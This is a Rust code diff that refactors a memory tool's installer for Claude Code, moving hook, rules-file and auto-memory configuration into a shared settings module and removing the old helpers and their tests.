@@ -50,6 +50,7 @@ use std::io::{self, BufRead, Write as _};
 use std::path::Path;
 
 use crate::agent_cli::{self, AgentCli, McpReport, McpStatus};
+use crate::claude_settings;
 use crate::config::{self, Config, LlmSection, Provider};
 use crate::error::RecallError;
 use crate::paths;
@@ -414,69 +415,97 @@ fn warm_embedding_model(memory_dir: &Path, roots: &paths::ConfigRoots) -> WarmOu
     }
 }
 
-// ── Claude Code hooks ────────────────────────────────────────────────────
+// ── Claude Code: hooks, rules file, auto-memory ──────────────────────────
 
-/// Auto-configure Claude Code hooks (settings.json).
-/// Returns true if hooks were configured.
+/// Configure Claude Code for this store: the three hooks, the rules file
+/// that imports MEMORY.md, and the auto-memory question.
 ///
-/// The file is `<roots.claude_dir()>/settings.json` — `~/.claude/settings.json`
-/// in production, a sandbox under test — regardless of where pulse_root is.
-/// The binary the hooks will invoke comes from `roots` too, so nothing here is
+/// All three go through [`claude_settings::claude_code_target`], so they skip
+/// for the same reasons with the same words. The settings file is
+/// `<roots.claude_dir()>/settings.json` — `~/.claude/settings.json` in
+/// production, a sandbox under test — regardless of where `pulse_root` is,
+/// and the binary the hooks invoke comes from `roots` too: nothing here is
 /// decided by the path this process happens to be running from.
-fn configure_hooks(roots: &paths::ConfigRoots, pulse_root: &Path) -> bool {
-    let Some(claude_dir) = roots.claude_dir() else {
-        return false;
+fn configure_claude_code(
+    roots: &paths::ConfigRoots,
+    pulse_root: &Path,
+    reader: &mut dyn BufRead,
+    interactive: bool,
+    env_disable: Option<&str>,
+) {
+    let target = match claude_settings::claude_code_target(roots, pulse_root) {
+        Ok(target) => target,
+        // Nothing to configure and nothing worth saying: a machine without
+        // Claude Code is using another agent CLI on purpose.
+        Err(claude_settings::Skip::NoClaudeCode) => return,
+        Err(skip) => {
+            print_status(
+                Status::Exists,
+                &format!("Skipped Claude Code hooks, rules file and auto-memory — {skip}"),
+            );
+            return;
+        }
     };
-
-    // A path under a build directory is a test harness or a debug build, not
-    // something a user's hooks should be pinned to for the life of the install.
-    if paths::is_build_dir(roots.recall_bin()) {
+    configure_hooks(&target, roots, pulse_root);
+    if let Err(skip) = target.memory_steps() {
         print_status(
             Status::Exists,
-            "Skipped hook install — running from a build directory",
+            &format!("Skipped rules file and auto-memory — {skip}"),
         );
-        return false;
+        return;
     }
-
-    install_hooks(
-        &claude_dir.join("settings.json"),
-        pulse_root,
-        roots.recall_bin(),
-    )
+    configure_rules(&target, pulse_root);
+    configure_auto_memory(&target, reader, interactive, env_disable);
 }
 
-/// Whether `root` is a pulse-null pulse. Pulse-null writes each pulse's own
-/// `.claude/` rules and puts MEMORY.md into the pulse's system prompt itself,
-/// so a user-level rules file would load it a second time in every pulse.
-fn is_pulse_root(root: &Path) -> bool {
-    root.join("pulse-null.toml").is_file()
+/// Install or repair the three hooks in the target's settings.json.
+/// Returns true when they are in place afterwards.
+fn configure_hooks(
+    target: &claude_settings::ClaudeTarget,
+    roots: &paths::ConfigRoots,
+    pulse_root: &Path,
+) -> bool {
+    let settings_path = target.settings_path();
+    let mut settings = match claude_settings::read_settings(&settings_path) {
+        Ok(settings) => settings,
+        Err(why) => {
+            print_status(Status::Error, &format!("{why} — hooks not configured"));
+            return false;
+        }
+    };
+    let change = match claude_settings::apply_hooks(&mut settings, pulse_root, roots.recall_bin()) {
+        Ok(change) => change,
+        Err(why) => {
+            print_status(Status::Error, &why);
+            return false;
+        }
+    };
+    for note in &change.notes {
+        print_status(Status::Exists, note);
+    }
+    if !change.changed {
+        print_status(Status::Exists, "Hooks already configured in settings.json");
+        return true;
+    }
+    match claude_settings::write_settings(&settings_path, &settings) {
+        Ok(()) => {
+            print_status(
+                Status::Created,
+                "Configured SessionStart + SessionEnd + PreCompact hooks in settings.json",
+            );
+            true
+        }
+        Err(why) => {
+            print_status(Status::Error, &why);
+            false
+        }
+    }
 }
 
 /// Install the rules file that imports MEMORY.md into every Claude Code
 /// session (#75) — the only channel that carries Layer 1 whole.
-///
-/// Skipped wherever hooks are (no Claude Code, a build-directory binary),
-/// and for a pulse root.
-fn configure_rules(roots: &paths::ConfigRoots, pulse_root: &Path) {
-    let Some(claude_dir) = roots.claude_dir() else {
-        return;
-    };
-    if paths::is_build_dir(roots.recall_bin()) {
-        print_status(
-            Status::Exists,
-            "Skipped rules file — running from a build directory",
-        );
-        return;
-    }
-    if is_pulse_root(pulse_root) {
-        print_status(
-            Status::Exists,
-            "Skipped rules file — pulse-null writes this pulse's own rules",
-        );
-        return;
-    }
-
-    match rules_file::install(claude_dir, pulse_root) {
+fn configure_rules(target: &claude_settings::ClaudeTarget, pulse_root: &Path) {
+    match rules_file::install(target.claude_dir(), pulse_root) {
         rules_file::Outcome::Written(path) => print_status(
             Status::Created,
             &format!(
@@ -505,56 +534,20 @@ fn configure_rules(roots: &paths::ConfigRoots, pulse_root: &Path) {
     }
 }
 
-/// Claude Code's own switch for its built-in auto-memory.
-const AUTO_MEMORY_ENV: &str = "CLAUDE_CODE_DISABLE_AUTO_MEMORY";
-
-/// Whether Claude Code's built-in auto-memory is on for this user: it is
-/// unless `settings.json` says `"autoMemoryEnabled": false`, or
-/// [`AUTO_MEMORY_ENV`] is truthy — in the environment (`env_disable`) or in
-/// the settings' own `env` block, which Claude Code applies at startup.
-fn auto_memory_on(settings: &serde_json::Value, env_disable: Option<&str>) -> bool {
-    fn truthy(value: &str) -> bool {
-        matches!(
-            value.trim().to_ascii_lowercase().as_str(),
-            "1" | "true" | "yes" | "on"
-        )
-    }
-    let setting_off = settings
-        .get("autoMemoryEnabled")
-        .and_then(serde_json::Value::as_bool)
-        == Some(false);
-    let settings_env_off = settings
-        .get("env")
-        .and_then(|env| env.get(AUTO_MEMORY_ENV))
-        .and_then(serde_json::Value::as_str)
-        .is_some_and(truthy);
-    !(setting_off || settings_env_off || env_disable.is_some_and(truthy))
-}
-
 /// Offer to turn off Claude Code's built-in auto-memory (#75).
 ///
 /// With it on, the user has a second curated store that recall-echo neither
 /// reads nor feeds — and it is the one the model is told to use. The choice
-/// is the user's: asked once, only when auto-memory is on and stderr is a
-/// terminal (`interactive`), defaulting to yes on Enter. End of input counts
-/// as no, so a piped install never changes a Claude Code setting by default;
-/// a non-interactive one gets a notice line instead. Skipped for a pulse root
-/// and wherever hooks are skipped.
+/// is the user's: asked once, only when auto-memory is on and the session is
+/// `interactive`; a non-interactive one gets a notice line instead.
 fn configure_auto_memory(
-    roots: &paths::ConfigRoots,
-    pulse_root: &Path,
+    target: &claude_settings::ClaudeTarget,
     reader: &mut dyn BufRead,
     interactive: bool,
     env_disable: Option<&str>,
 ) {
-    let Some(claude_dir) = roots.claude_dir() else {
-        return;
-    };
-    if paths::is_build_dir(roots.recall_bin()) || is_pulse_root(pulse_root) {
-        return;
-    }
-    let settings_path = claude_dir.join("settings.json");
-    let mut settings = match read_settings(&settings_path) {
+    let settings_path = target.settings_path();
+    let mut settings = match claude_settings::read_settings(&settings_path) {
         Ok(settings) => settings,
         Err(why) => {
             print_status(
@@ -564,7 +557,7 @@ fn configure_auto_memory(
             return;
         }
     };
-    if !auto_memory_on(&settings, env_disable) {
+    if !claude_settings::auto_memory_on(&settings, env_disable) {
         return;
     }
 
@@ -584,459 +577,32 @@ fn configure_auto_memory(
 
     eprintln!("\n{BOLD}{what}.{RESET}");
     eprintln!("  {DIM}{not_moved}{RESET}");
-    eprint!("  Turn it off? [Y/n] ");
+    if !ask_yes_default(reader, "Turn it off?") {
+        print_status(Status::Exists, "Left Claude Code's auto-memory on");
+        return;
+    }
+    claude_settings::disable_auto_memory(&mut settings);
+    match claude_settings::write_settings(&settings_path, &settings) {
+        Ok(()) => print_status(
+            Status::Created,
+            "Turned off Claude Code's auto-memory — MEMORY.md here is the one curated store",
+        ),
+        Err(why) => print_status(Status::Error, &why),
+    }
+}
+
+/// Ask a question that defaults to yes. Enter, `y` or `yes` accept; anything
+/// else, or end of input, declines — so a closed stdin never answers yes.
+fn ask_yes_default(reader: &mut dyn BufRead, question: &str) -> bool {
+    eprint!("  {question} [Y/n] ");
     let mut answer = String::new();
-    let accepted = match reader.read_line(&mut answer) {
+    match reader.read_line(&mut answer) {
         Ok(0) | Err(_) => false,
         Ok(_) => matches!(
             answer.trim().to_ascii_lowercase().as_str(),
             "" | "y" | "yes"
         ),
-    };
-    if !accepted {
-        print_status(Status::Exists, "Left Claude Code's auto-memory on");
-        return;
     }
-
-    settings["autoMemoryEnabled"] = serde_json::Value::Bool(false);
-    let written = serde_json::to_string_pretty(&settings)
-        .map_err(|e| e.to_string())
-        .and_then(|content| {
-            write_settings_atomically(&settings_path, &content).map_err(|e| e.to_string())
-        });
-    match written {
-        Ok(()) => print_status(
-            Status::Created,
-            "Turned off Claude Code's auto-memory — MEMORY.md here is the one curated store",
-        ),
-        Err(e) => print_status(
-            Status::Error,
-            &format!("Failed to write {}: {e}", settings_path.display()),
-        ),
-    }
-}
-
-/// Read `settings.json` for an edit.
-///
-/// Absent means a fresh install: `{}`. Unreadable or unparseable means the
-/// user's existing configuration — falling back to `{}` there would
-/// overwrite everything they have (permissions, MCP servers, env) with a
-/// file containing nothing but our change. The `Err` names why.
-fn read_settings(settings_path: &Path) -> Result<serde_json::Value, String> {
-    if !settings_path.exists() {
-        return Ok(serde_json::json!({}));
-    }
-    let content = fs::read_to_string(settings_path)
-        .map_err(|e| format!("Could not read {} ({e})", settings_path.display()))?;
-    let settings: serde_json::Value = serde_json::from_str(&content).map_err(|e| {
-        format!(
-            "{} is not valid JSON ({e}) — refusing to overwrite it; fix the file and re-run init",
-            settings_path.display()
-        )
-    })?;
-    if !settings.is_object() {
-        return Err(format!(
-            "{} is not a JSON object — refusing to overwrite it",
-            settings_path.display()
-        ));
-    }
-    Ok(settings)
-}
-
-/// Install or repair the three hooks in the settings file at `settings_path`.
-///
-/// Split from [`configure_hooks`] so the writer can be exercised against a
-/// named file with a named binary: where it writes is an argument, never a
-/// path this process resolves for itself (#59).
-fn install_hooks(settings_path: &Path, pulse_root: &Path, recall_bin: &str) -> bool {
-    let mut settings = match read_settings(settings_path) {
-        Ok(settings) => settings,
-        Err(why) => {
-            print_status(Status::Error, &format!("{why} — hooks not configured"));
-            return false;
-        }
-    };
-
-    let root = fs::canonicalize(pulse_root).unwrap_or_else(|_| pulse_root.to_path_buf());
-    // A control character (a newline especially) inside a shell command line
-    // is unrecoverable for the user reading settings.json later.
-    if root.display().to_string().chars().any(char::is_control) {
-        print_status(
-            Status::Error,
-            "Pulse root contains control characters — refusing to write it into a shell hook",
-        );
-        return false;
-    }
-
-    // The binary path is interpolated bare (the matcher recognizes hooks by
-    // literal shape, so it cannot be quoted). A replaced-in-place binary or a
-    // path outside the conservative install-path alphabet is refused rather
-    // than baked into a broken or dangerous command line.
-    if recall_bin.ends_with(" (deleted)") {
-        print_status(
-            Status::Error,
-            "The running binary was replaced on disk during init — re-run init",
-        );
-        return false;
-    }
-    if !is_shell_safe_bin(recall_bin) {
-        print_status(
-            Status::Error,
-            &format!(
-                "Refusing to write hooks: binary path {recall_bin} contains characters unsafe \
-                 in a shell command — install recall-echo at a plain path and re-run init"
-            ),
-        );
-        return false;
-    }
-
-    let mut notes: Vec<String> = Vec::new();
-    let changed = match upsert_recall_hooks(&mut settings, recall_bin, &root, &mut notes) {
-        Ok(changed) => changed,
-        Err(why) => {
-            print_status(
-                Status::Error,
-                &format!("settings.json: {why} — hooks not configured"),
-            );
-            return false;
-        }
-    };
-    for note in &notes {
-        print_status(Status::Exists, note);
-    }
-
-    if changed {
-        match serde_json::to_string_pretty(&settings) {
-            Ok(content) => match write_settings_atomically(settings_path, &content) {
-                Ok(()) => {
-                    print_status(
-                        Status::Created,
-                        "Configured SessionStart + SessionEnd + PreCompact hooks in settings.json",
-                    );
-                    return true;
-                }
-                Err(e) => print_status(
-                    Status::Error,
-                    &format!("Failed to write settings.json: {e}"),
-                ),
-            },
-            Err(e) => print_status(Status::Error, &format!("Failed to serialize settings: {e}")),
-        }
-    } else {
-        print_status(Status::Exists, "Hooks already configured in settings.json");
-        return true;
-    }
-
-    false
-}
-
-/// Replace settings.json without a window where it is truncated or absent.
-///
-/// The previous content is kept as `settings.json.bak`; the new content lands
-/// via a temp file and rename, keeping the original file's permissions — the
-/// file can hold permission allowlists and credentials, so its mode is not
-/// ours to loosen.
-fn write_settings_atomically(path: &Path, content: &str) -> std::io::Result<()> {
-    if path.exists() {
-        let _ = fs::copy(path, path.with_extension("json.bak"));
-    }
-    // Pid-suffixed so concurrent inits cannot rename each other's half-written
-    // temp into place.
-    let tmp = path.with_extension(format!("json.tmp.{}", std::process::id()));
-    let _ = fs::remove_file(&tmp);
-    // Owner-only from birth: the file can hold credentials, and creating at
-    // the umask default before tightening leaves a world-readable window.
-    #[cfg(unix)]
-    {
-        use std::os::unix::fs::OpenOptionsExt;
-        let mut f = fs::OpenOptions::new()
-            .write(true)
-            .create_new(true)
-            .mode(0o600)
-            .open(&tmp)?;
-        f.write_all(content.as_bytes())?;
-        f.sync_all()?;
-    }
-    #[cfg(not(unix))]
-    fs::write(&tmp, content)?;
-    if let Ok(meta) = fs::metadata(path) {
-        let _ = fs::set_permissions(&tmp, meta.permissions());
-    }
-    fs::rename(&tmp, path)
-}
-
-/// Quote a path for use inside a shell hook command line.
-///
-/// Always single-quoted: POSIX single quotes disable every expansion — `$`,
-/// backticks, `;`, `|`, spaces — and an embedded `'` is closed, escaped, and
-/// reopened. Quoting only "when needed" is how metacharacters slip through.
-fn shell_path(path: &Path) -> String {
-    format!("'{}'", path.display().to_string().replace('\'', r"'\''"))
-}
-
-/// Whether a binary path is safe to interpolate bare into a hook command.
-///
-/// The binary path is the one interpolated value that cannot be quoted: the
-/// existing-hook matcher recognizes our commands by their literal shape, and
-/// quoting would change it. Unlike the pulse root — arbitrary user data —
-/// an install path is conventional, so a conservative character set covers
-/// every real install and anything outside it is refused with a message
-/// rather than baked into a broken or dangerous command line.
-fn is_shell_safe_bin(path: &str) -> bool {
-    !path.is_empty()
-        && path
-            .chars()
-            .all(|c| c.is_ascii_alphanumeric() || "/._+-".contains(c))
-}
-
-/// Shell operators (scanned outside single-quoted spans) whose presence marks
-/// a hook command as hand-customized.
-///
-/// The canonical commands this installer writes contain none of these outside
-/// quotes, so a recall-echo hook that does — `recall-echo archive-session ||
-/// true`, a chained cleanup, a redirect — was shaped by the user on purpose,
-/// and rewriting it would silently destroy that intent. Prefix wrappers
-/// (`timeout`, `nice`, `env`) carry no operator at all; those are caught by
-/// the canonical-shape check in [`is_bare_recall_invocation`] instead.
-const SHELL_OPERATORS: [&str; 8] = [";", "&", "|", ">", "<", "$", "`", "\n"];
-
-/// The command text with single-quoted spans removed — the only part where a
-/// shell operator means anything. The pulse root recall-echo itself quotes
-/// may legally contain `;` or `$`; scanning through the quotes would make our
-/// own canonical hooks look customized and permanently unrepairable.
-fn strip_single_quoted(cmd: &str) -> String {
-    let mut out = String::new();
-    let mut in_quote = false;
-    for c in cmd.chars() {
-        match c {
-            '\'' => in_quote = !in_quote,
-            _ if in_quote => {}
-            _ => out.push(c),
-        }
-    }
-    out
-}
-
-/// Whether a hook command is a plain recall-echo invocation this installer
-/// may rewrite: the first token is a recall-echo binary, the second is the
-/// expected subcommand, and no shell operator appears outside quotes.
-/// Anything else — a `timeout`/`nice`/`env` wrapper, a `|| true` guard, a
-/// chained command — is user configuration.
-fn is_bare_recall_invocation(cmd: &str, subcommand: &str) -> bool {
-    if SHELL_OPERATORS
-        .iter()
-        .any(|op| strip_single_quoted(cmd).contains(op))
-    {
-        return false;
-    }
-    let mut parts = cmd.split_whitespace();
-    let Some(first) = parts.next() else {
-        return false;
-    };
-    Path::new(first)
-        .file_name()
-        .is_some_and(|f| f == "recall-echo")
-        && parts.next() == Some(subcommand)
-}
-
-/// The sources the SessionStart `consume` hook fires on.
-const SESSION_START_MATCHER: &str = "startup|resume|clear";
-
-/// Install or repair the three recall-echo hooks in a settings.json value.
-///
-/// The pulse root is baked into every command: hooks run with the harness's
-/// cwd, which is wherever the user happens to be working, and a bare
-/// `recall-echo archive-session` resolves against that — capture then only
-/// works when the shell sits in the pulse root. MCP registration already
-/// bakes the root for reads; this is the write-side counterpart.
-///
-/// A plain recall-echo hook whose command differs from the expected line —
-/// the bare pre-4.2 form, a stale root — is rewritten in place and reported,
-/// so re-running `init` repairs a broken install instead of declaring it
-/// present. Duplicate recall-echo hooks are collapsed to one — a repaired
-/// duplicate would archive every session twice at double the extraction
-/// bill. Two kinds of hooks are never rewritten: ones that are not
-/// recall-echo's at all, and customized invocations (wrappers, guards,
-/// chains — see [`is_bare_recall_invocation`]), each reported through
-/// `notes` with the canonical command so the user can migrate it by hand.
-///
-/// Returns `Ok(changed)`, or `Err` naming what in the settings shape made
-/// the install unsafe to attempt.
-fn upsert_recall_hooks(
-    settings: &mut serde_json::Value,
-    recall_bin: &str,
-    pulse_root: &Path,
-    notes: &mut Vec<String>,
-) -> Result<bool, String> {
-    let root = shell_path(pulse_root);
-    // SessionStart injects EPHEMERAL.md into context via stdout on startup,
-    // resume and `/clear` — a cleared session still wants to know what came
-    // before it (#75). Skips `compact`: the conversation continues, nothing
-    // prior to surface. `consume` takes the root positionally.
-    let plan: [(&str, Option<&str>, &str, String); 3] = [
-        (
-            "SessionStart",
-            Some(SESSION_START_MATCHER),
-            "consume",
-            format!("{recall_bin} consume {root}"),
-        ),
-        (
-            "SessionEnd",
-            None,
-            "archive-session",
-            format!("{recall_bin} archive-session --pulse-root {root}"),
-        ),
-        (
-            "PreCompact",
-            None,
-            "checkpoint",
-            format!("{recall_bin} checkpoint --trigger precompact --pulse-root {root}"),
-        ),
-    ];
-
-    let hooks = settings
-        .as_object_mut()
-        .and_then(|o| {
-            o.entry("hooks")
-                .or_insert_with(|| serde_json::json!({}))
-                .as_object_mut()
-        })
-        .ok_or_else(|| "settings.json root is not a JSON object".to_string())?;
-
-    let mut changed = false;
-    for (event, matcher, subcommand, expected) in plan {
-        if upsert_hook(hooks, event, matcher, subcommand, &expected, notes)? {
-            changed = true;
-        }
-    }
-    Ok(changed)
-}
-
-/// The flag hooks written before 4.6.0 carried the pulse root under.
-const LEGACY_ROOT_FLAG: &str = "--entity-root";
-
-/// What rewriting a plain recall-echo hook to the canonical command did, in
-/// the words the user needs: a rename of the pre-4.6.0 flag, or a root the
-/// hook did not carry (or carried stale).
-fn rewrite_note(event: &str, previous: &str) -> String {
-    if previous.contains(LEGACY_ROOT_FLAG) {
-        format!("{event}: renamed {LEGACY_ROOT_FLAG} to --pulse-root in the recall-echo hook")
-    } else {
-        format!("{event}: updated recall-echo hook to carry the pulse root")
-    }
-}
-
-/// Ensure one event carries exactly one canonical recall-echo hook command.
-///
-/// Every recall-echo hook under the event is considered: the first canonical
-/// (or repairable-and-repaired) occurrence stands, further duplicates are
-/// removed, customized invocations are reported and left alone. A group
-/// whose hooks are all exactly ours also gets its matcher synced. When no
-/// recall-echo hook exists at all, a new group is appended.
-///
-/// Returns `Ok(changed)`, or `Err` when the event's value is not an array —
-/// someone else's structure, not ours to repair or append to.
-fn upsert_hook(
-    hooks: &mut serde_json::Map<String, serde_json::Value>,
-    event: &str,
-    matcher: Option<&str>,
-    subcommand: &str,
-    expected: &str,
-    notes: &mut Vec<String>,
-) -> Result<bool, String> {
-    // Recognize ours by the base command name, not the full binary path.
-    let marker = format!("recall-echo {subcommand}");
-    let not_array = || format!("\"hooks\".\"{event}\" is not an array — fix it and re-run init");
-
-    let mut changed = false;
-    let mut found = false;
-    let mut have_canonical = false;
-
-    if let Some(value) = hooks.get_mut(event) {
-        let arr = value.as_array_mut().ok_or_else(not_array)?;
-        for group in arr.iter_mut() {
-            let Some(inner) = group.get_mut("hooks").and_then(|h| h.as_array_mut()) else {
-                continue;
-            };
-            let mut i = 0;
-            while i < inner.len() {
-                let Some(cmd) = inner[i]
-                    .get("command")
-                    .and_then(|c| c.as_str())
-                    .map(String::from)
-                else {
-                    i += 1;
-                    continue;
-                };
-                if !cmd.contains(&marker) {
-                    i += 1;
-                    continue;
-                }
-                found = true;
-                let repairable = cmd == expected || is_bare_recall_invocation(&cmd, subcommand);
-                if repairable && have_canonical {
-                    inner.remove(i);
-                    notes.push(format!("{event}: removed a duplicate recall-echo hook"));
-                    changed = true;
-                    continue; // index now points at the next element
-                }
-                if cmd == expected {
-                    have_canonical = true;
-                } else if repairable {
-                    inner[i]["command"] = serde_json::Value::String(expected.to_string());
-                    notes.push(rewrite_note(event, &cmd));
-                    have_canonical = true;
-                    changed = true;
-                } else {
-                    notes.push(format!(
-                        "{event}: left a customized recall-echo hook unchanged: {cmd} — note it \
-                         does not carry the pulse root; the canonical command is: {expected}"
-                    ));
-                }
-                i += 1;
-            }
-            // Sync the matcher only when every hook in the group is exactly
-            // ours — a shared group's matcher governs foreign hooks too.
-            let all_ours = !inner.is_empty()
-                && inner
-                    .iter()
-                    .all(|h| h.get("command").and_then(|c| c.as_str()) == Some(expected));
-            if all_ours {
-                if let Some(m) = matcher {
-                    if group.get("matcher").and_then(|v| v.as_str()) != Some(m) {
-                        group["matcher"] = serde_json::Value::String(m.to_string());
-                        changed = true;
-                    }
-                }
-            }
-        }
-        // A dedup pass can leave a group with no hooks; an empty group is
-        // noise the harness still iterates.
-        arr.retain(|group| {
-            group
-                .get("hooks")
-                .and_then(|h| h.as_array())
-                .is_none_or(|inner| !inner.is_empty())
-        });
-    }
-
-    if found {
-        return Ok(changed);
-    }
-
-    let arr = hooks
-        .entry(event)
-        .or_insert_with(|| serde_json::json!([]))
-        .as_array_mut()
-        .ok_or_else(not_array)?;
-    let mut group = serde_json::json!({
-        "hooks": [{"type": "command", "command": expected}]
-    });
-    if let Some(m) = matcher {
-        group["matcher"] = serde_json::Value::String(m.to_string());
-    }
-    arr.push(group);
-    Ok(true)
 }
 
 // ── MCP registration ─────────────────────────────────────────────────────
@@ -1286,10 +852,8 @@ pub fn run_with(
     // extraction provider: a user who extracts with grok still wants their
     // Claude Code sessions archived. `configure_hooks` no-ops when Claude Code
     // is not installed.
-    configure_hooks(roots, pulse_root);
-    configure_rules(roots, pulse_root);
-    let env_disable = std::env::var(AUTO_MEMORY_ENV).ok();
-    configure_auto_memory(
+    let env_disable = std::env::var(claude_settings::AUTO_MEMORY_ENV).ok();
+    configure_claude_code(
         roots,
         pulse_root,
         reader,
@@ -1502,339 +1066,22 @@ mod tests {
         assert_eq!(summary.mcp_ready(), ["claude-code", "grok"]);
     }
 
-    fn upsert(settings: &mut serde_json::Value, root: &str) -> (bool, Vec<String>) {
-        let mut skipped = Vec::new();
-        let changed = upsert_recall_hooks(
-            settings,
-            "/usr/local/bin/recall-echo",
-            Path::new(root),
-            &mut skipped,
-        )
-        .unwrap();
-        (changed, skipped)
-    }
-
-    #[test]
-    fn hooks_carry_the_pulse_root() {
-        let mut settings = serde_json::json!({});
-        let (changed, skipped) = upsert(&mut settings, "/home/d/.wiseferry");
-        assert!(changed);
-        assert!(skipped.is_empty());
-
-        let text = settings.to_string();
-        assert!(text.contains("archive-session --pulse-root '/home/d/.wiseferry'"));
-        assert!(text.contains("checkpoint --trigger precompact --pulse-root '/home/d/.wiseferry'"));
-        assert!(text.contains("consume '/home/d/.wiseferry'"));
-    }
-
-    /// The pre-4.2 bare hook is exactly what left capture broken outside the
-    /// pulse root. A re-run of `init` must repair it, not declare it present.
-    #[test]
-    fn a_legacy_bare_hook_is_rewritten_not_skipped() {
-        let mut settings = serde_json::json!({
-            "hooks": {
-                "SessionStart": [{
-                    "matcher": "startup|resume",
-                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo consume"}]
-                }],
-                "SessionEnd": [{
-                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session"}]
-                }],
-                "PreCompact": [{
-                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo checkpoint --trigger precompact"}]
-                }]
-            }
-        });
-        let (changed, notes) = upsert(&mut settings, "/home/d/.wiseferry");
-        assert!(changed);
-        // Every rewrite is reported — a silent replacement of a command the
-        // user may have edited is how trust in the installer dies.
-        assert_eq!(notes.len(), 3, "{notes:?}");
-        assert!(notes.iter().all(|n| n.contains("updated")), "{notes:?}");
-
-        let text = settings.to_string();
-        assert!(text.contains("archive-session --pulse-root '/home/d/.wiseferry'"));
-        // Rewritten in place, not duplicated alongside the bare form.
-        assert_eq!(text.matches("archive-session").count(), 1);
-        assert_eq!(text.matches("checkpoint").count(), 1);
-        assert_eq!(text.matches("consume").count(), 1);
-    }
-
-    /// The canonical 4.2–4.5 hooks spell the root flag `--entity-root`.
-    /// Re-running `init` renames it in place, and a second run finds nothing
-    /// left to do.
-    #[test]
-    fn a_pre_4_6_entity_root_hook_is_rewritten_to_pulse_root() {
-        let mut settings = serde_json::json!({
-            "hooks": {
-                "SessionStart": [{
-                    "matcher": "startup|resume",
-                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo consume '/home/d/.wiseferry'"}]
-                }],
-                "SessionEnd": [{
-                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session --entity-root '/home/d/.wiseferry'"}]
-                }],
-                "PreCompact": [{
-                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo checkpoint --trigger precompact --entity-root '/home/d/.wiseferry'"}]
-                }]
-            }
-        });
-        let (changed, notes) = upsert(&mut settings, "/home/d/.wiseferry");
-        assert!(changed);
-        assert_eq!(
-            notes.len(),
-            2,
-            "consume takes the root positionally: {notes:?}"
-        );
-        assert!(
-            notes
-                .iter()
-                .all(|n| n.contains("renamed --entity-root to --pulse-root")),
-            "{notes:?}"
-        );
-
-        let text = settings.to_string();
-        assert!(!text.contains("--entity-root"), "{text}");
-        assert!(text.contains("archive-session --pulse-root '/home/d/.wiseferry'"));
-        assert!(text.contains("checkpoint --trigger precompact --pulse-root '/home/d/.wiseferry'"));
-        assert_eq!(text.matches("archive-session").count(), 1);
-        assert_eq!(text.matches("checkpoint").count(), 1);
-
-        let after_first = settings.clone();
-        let (changed_again, notes_again) = upsert(&mut settings, "/home/d/.wiseferry");
-        assert!(!changed_again, "{notes_again:?}");
-        assert_eq!(settings, after_first);
-    }
-
-    /// A guarded hook still spelling `--entity-root` is the user's; it keeps
-    /// working through the flag alias, and is reported rather than rewritten.
-    #[test]
-    fn a_guarded_entity_root_hook_is_left_to_the_alias() {
-        let guarded =
-            "/usr/local/bin/recall-echo archive-session --entity-root '/home/d/pulse' || true";
-        let mut settings = serde_json::json!({
-            "hooks": {
-                "SessionEnd": [{"hooks": [{"type": "command", "command": guarded}]}]
-            }
-        });
-        let (_, notes) = upsert(&mut settings, "/home/d/pulse");
-        assert!(settings.to_string().contains(guarded));
-        assert_eq!(notes.len(), 1, "{notes:?}");
-        assert!(notes[0].contains("left a customized"), "{notes:?}");
-    }
-
-    #[test]
-    fn a_correct_hook_set_is_left_unchanged() {
-        let mut settings = serde_json::json!({});
-        upsert(&mut settings, "/home/d/.wiseferry");
-
-        let before = settings.clone();
-        let (changed, _) = upsert(&mut settings, "/home/d/.wiseferry");
-        assert!(!changed);
-        assert_eq!(settings, before);
-    }
-
-    fn session_start_matchers(settings: &serde_json::Value) -> Vec<String> {
-        settings["hooks"]["SessionStart"]
-            .as_array()
-            .unwrap()
-            .iter()
-            .map(|group| group["matcher"].as_str().unwrap_or_default().to_string())
-            .collect()
-    }
-
-    /// A cleared session still gets EPHEMERAL.md (#75).
-    #[test]
-    fn init_session_start_matcher_includes_clear() {
-        let mut settings = serde_json::json!({});
-        upsert(&mut settings, "/home/d/.wiseferry");
-        assert_eq!(session_start_matchers(&settings), ["startup|resume|clear"]);
-    }
-
-    /// A 4.6 install's recall-echo-only group is upgraded on re-init.
-    #[test]
-    fn init_upgrades_recall_only_startup_resume_group() {
-        let mut settings = serde_json::json!({});
-        upsert(&mut settings, "/home/d/.wiseferry");
-        settings["hooks"]["SessionStart"][0]["matcher"] = "startup|resume".into();
-
-        let (changed, _) = upsert(&mut settings, "/home/d/.wiseferry");
-        assert!(changed);
-        assert_eq!(session_start_matchers(&settings), ["startup|resume|clear"]);
-    }
-
-    /// A group shared with someone else's hook keeps its matcher: it governs
-    /// their hook too.
-    #[test]
-    fn init_keeps_shared_group_matcher() {
-        let mut settings = serde_json::json!({});
-        upsert(&mut settings, "/home/d/.wiseferry");
-        let ours = settings["hooks"]["SessionStart"][0]["hooks"][0].clone();
-        settings["hooks"]["SessionStart"] = serde_json::json!([{
-            "matcher": "startup",
-            "hooks": [ours, {"type": "command", "command": "notify-send hello"}]
-        }]);
-
-        let (changed, _) = upsert(&mut settings, "/home/d/.wiseferry");
-        assert!(!changed);
-        assert_eq!(session_start_matchers(&settings), ["startup"]);
-    }
-
-    #[test]
-    fn foreign_hooks_are_never_touched() {
-        let mut settings = serde_json::json!({
-            "hooks": {
-                "SessionEnd": [{
-                    "hooks": [{"type": "command", "command": "notify-send done"}]
-                }]
-            }
-        });
-        upsert(&mut settings, "/home/d/.wiseferry");
-
-        let text = settings.to_string();
-        assert!(text.contains("notify-send done"));
-        assert!(text.contains("archive-session --pulse-root '/home/d/.wiseferry'"));
-    }
-
-    /// A recall-echo hook the user wrapped or guarded — the `|| true`
-    /// SessionEnd guard pulse-null depends on, a `timeout` prefix, a chained
-    /// cleanup — is deliberate configuration. Repairing it would break it;
-    /// it must be reported and left alone, and not duplicated either.
-    #[test]
-    fn a_wrapped_recall_hook_is_reported_not_rewritten() {
-        let mut settings = serde_json::json!({
-            "hooks": {
-                "SessionEnd": [{
-                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session || true"}]
-                }]
-            }
-        });
-        let (_, skipped) = upsert(&mut settings, "/home/d/.wiseferry");
-        assert_eq!(skipped.len(), 1);
